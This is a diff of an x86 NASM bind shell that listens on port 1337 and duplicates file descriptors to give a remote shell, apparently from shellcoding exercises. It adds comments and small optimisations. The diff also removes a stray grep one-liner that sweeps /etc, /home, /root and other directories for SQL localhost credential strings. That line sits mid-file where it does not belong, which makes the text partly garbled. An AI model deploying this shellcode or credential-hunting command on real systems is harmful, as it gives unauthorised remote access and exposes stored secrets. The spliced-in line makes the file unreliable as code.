@@ -1,7 +1,5 @@
 	; Filename: bind_shell.nasm
 
-
-
 global _start
 
 	; | EAX | system call numer ( + return data ) |
@@ -16,26 +14,21 @@ section .text
 _start:
 
 	; Create socket
-	xor eax, eax
 	xor ebx, ebx
+	mul ebx             ; zero out eax, and edx
 	xor ecx, ecx
 
-	mov al, 0x66  		; syscall: int socketcall(int call, unsigned long *args)	;
-	mov bl, 0x1			; int socket(int domain, int type, int protocol)	;
+	mov al, 0x66  		; syscall: int socketcall(int call, unsigned long *args)	
+	mov bl, 0x1			; int socket(int domain, int type, int protocol)  : SYS_SOCKET (0x01)	
 
 						; *args: push in reverse order to stack
-	push ecx			; protocol: IPPROTO_IP (0)
+	push 0x6			; protocol = IPPROTO_TCP (6) - 
 	push 0x1			; type = SOCK_STREAM (1)
-	push 0x2			; domain = AF_INET
+	push 0x2			; domain = AF_INET (2)
 	mov ecx, esp
+
 	int 0x80
-
-
 	mov edi, eax 		; store socket ptr to edi in edx
-
-
-grep -Prizo "sql(.|\n){1,100}(127\.0\.0\.1|localhost).*\n.*\n" /etc /opt /var /home /root /srv --color=always 2>/dev/null | tr ':' '\n'
-
 
 	; bind socket
 	xor eax, eax
@@ -59,20 +52,19 @@ grep -Prizo "sql(.|\n){1,100}(127\.0\.0\.1|localhost).*\n.*\n" /etc /opt /var /h
 						; }	;
 
 					
-						; setup stack for sockaddr *addr
+						; setup stack for [sockaddr *addr] structure
 	push 0x0			; INADDRY_ANY ... REMOVE??    /usr/src/linux-headers-5.10.0-kali7-common/include/uapi/linux/in.h
 	push word 0x3905	; port 1337 = 0x539  = rev.. 0x3905
 	push word 0x2		; sa_family_t = AF_INET
-	mov ecx, esp	
+	mov ecx, esp		; move pointer to structure into ecx 
 
 						; bind() - push args to stack
 	push 0x10			; addrlen
-	push ecx			; socaddr *addr (on stack)
+	push ecx			; ptr socaddr *addr (on stack)
 	push edi			; ptr to socket from above
 
 	mov ecx, esp
 	int 0x80		
-
 
 
 	; listen
@@ -88,7 +80,6 @@ grep -Prizo "sql(.|\n){1,100}(127\.0\.0\.1|localhost).*\n.*\n" /etc /opt /var /h
 
 	mov ecx, esp
 	int 0x80
-
 
 
 
@@ -118,7 +109,7 @@ grep -Prizo "sql(.|\n){1,100}(127\.0\.0\.1|localhost).*\n.*\n" /etc /opt /var /h
 	xor ecx, ecx		; zero out ecx
 	mov cl, 0x2 		; set the counter (for loop)
 	
-loop:				
+loop:					; Loop through all file descriptors
 	mov al, 0x3f		; syscall: dup2 (63)  -- NOTE: eax was cleared above. Good to reduce # of instructions.
 	int 0x80			; exec dup2
 	dec ecx				; decrement counter
